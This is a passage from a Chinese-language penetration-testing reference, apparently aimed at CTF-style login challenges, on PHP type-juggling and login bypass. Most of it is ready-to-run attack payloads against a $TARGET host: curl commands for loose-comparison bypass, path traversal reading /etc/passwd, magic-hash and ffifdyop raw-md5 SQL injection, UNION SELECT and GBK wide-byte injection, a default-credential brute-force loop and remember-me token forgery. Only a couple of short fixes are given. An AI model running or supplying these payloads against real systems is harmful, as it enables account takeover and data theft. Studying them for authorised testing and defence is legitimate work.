...
- Type Juggling 利用 payload 与登录绕过技术 → 下文对应 REF 章节


---

## REF: type-juggling-exploitation

# Type Juggling 利用 Payload 与登录绕过技术

## PHP switch/case 类型混淆

`switch` 语句内部使用松散比较（`==`），可被类型杂耍利用：

```php
switch ($_GET['action']) {
    case 0: admin_panel(); break;   // 管理员操作
    case 1: user_panel(); break;    // 普通用户
}
```

```bash
# 非数字字符串与 0 松散比较为 true（PHP 5.x/7.x），直接进入 case 0
curl "$TARGET/index.php?action=any_string"
```

## in_array 松散比较陷阱

```php
if (in_array($_GET['page'], [0, 1, 2])) {
    include $_GET['page'] . ".php";  // 文件包含
}
```

```bash
# "0abc" == 0 为 true，绕过白名单
curl "$TARGET/view.php?page=0../../../etc/passwd%00"
```

修复：第三个参数设为 `true` 强制严格比较 — `in_array($val, $arr, true)`。
...
| 输入字符串 | md5(md5()) 值 |
|-----------|---------------|
| `7r4lGXn1f3` | `0e269831390447826901401837485522` |
| `CbDLytmyGm2` | `0e551218024191957860755826674784` |

### ffifdyop — 通过 md5 raw output 实现 SQL 注入

```php
$sql = "SELECT * FROM users WHERE password = '" . md5($input, true) . "'";
```

`md5("ffifdyop", true)` 的原始二进制包含 `'or'6...`，构成有效 SQL 注入：

```bash
curl -X POST "$TARGET/login.php" -d "password=ffifdyop"
```
...
JSON 对象传入后 `password=password=1` 被解析为 `password=(password=1)`，结果恒真：
...
需要已知合法用户名。添加 `"stringifyObjects":true` 可防御此攻击。
...
-- UNION SELECT 注入已知哈希（用 Pass1234. 作为密码登录）
' AND 1=0 UNION ALL SELECT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
' AND 1=0 UNION ALL SELECT 'admin', md5('Pass1234.')#
```

```bash
# 宽字节注入：GBK 编码环境下 %bf' 吃掉反斜杠
curl "$TARGET/login.php" --data-urlencode "username=%bf' Or 1=1-- -" -d "password=x"
```
...
for user in admin root administrator; do
  for pass in admin password 123456 admin123 root toor ""; do
    curl -s -X POST "$TARGET/login.php" -d "username=$user&password=$pass" \
      | grep -i "success\|welcome\|dashboard\|flag" && echo " [$user:$pass]"
  done
done
```
...
```bash
# 参数缺失 — isset() 判断缺失可能导致绕过
curl -X POST "$TARGET/login.php" -d "username=admin"

# 直接访问受限页面
curl -s "$TARGET/admin/dashboard.php" -v 2>&1 | grep -i "location\|200\|flag"

# Remember Me 令牌伪造 — 测试是否为 md5("admin")
curl -s "$TARGET/dashboard.php" -b "remember_me=21232f297a57a5a743894a0e4a801fc3"
```
...
登录页面渗透测试流程：
1. 默认凭据 / 弱口令爆破
2. PHP type juggling（JSON true / 0 / [] / magic hash）
3. strcmp 数组绕过（password[]=x）
4. SQL 注入（' or 1=1-- / UNION SELECT 已知哈希）
5. NoSQL 注入（{"$gt":""}）
6. 参数缺失 / 空参数绕过
7. 直接访问后台 URL
8. Remember Me 令牌分析
